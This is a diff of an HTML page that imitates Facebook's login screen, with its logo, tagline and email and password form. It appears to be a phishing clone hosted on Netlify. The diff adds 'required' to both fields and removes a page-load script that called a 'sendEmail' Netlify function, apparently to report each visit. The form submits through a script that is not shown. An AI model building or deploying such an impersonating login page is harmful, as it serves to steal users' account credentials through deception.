@@ -1,36 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Facebook</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to Facebook</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <div class="container">
-        <div class="facebook-content">
-            <img src="facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
-            <p>Facebook helps you connect and share with the people in your life.</p>
-        </div>
-        <div class="login-box">
-            <form id="loginForm">
-                <input type="text" placeholder="Email address or phone number" name="email">
-                <input type="password" placeholder="Password" name="password">
-                <button type="submit">Log in</button>
-                <a href="#">Forgotten account?</a>
-                <hr>
-                <a href="#" class="create-account">Sign up for Facebook</a>
-            </form>
-        </div>
+  <div class="container">
+    <div class="facebook-content">
+      <img src="facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
+      <p>Facebook helps you connect and share with the people in your life.</p>
     </div>
-    <!-- This script triggers your Netlify function on page load -->
-    <script>
-        fetch('/.netlify/functions/sendEmail')
-            .then(response => response.json())
-            .then(data => console.log('Email notification:', data))
-            .catch(error => console.error('Error sending email notification:', error));
-    </script>
-    <script src="script.js"></script>
+    <div class="login-box">
+      <form id="loginForm">
+        <input type="text" placeholder="Email address or phone number" name="email" required>
+        <input type="password" placeholder="Password" name="password" required>
+        <button type="submit">Log in</button>
+        <a href="#">Forgotten account?</a>
+        <hr>
+        <a href="#" class="create-account">Sign up for Facebook</a>
+      </form>
+    </div>
+  </div>
+  <script src="script.js"></script>
 </body>
 </html>
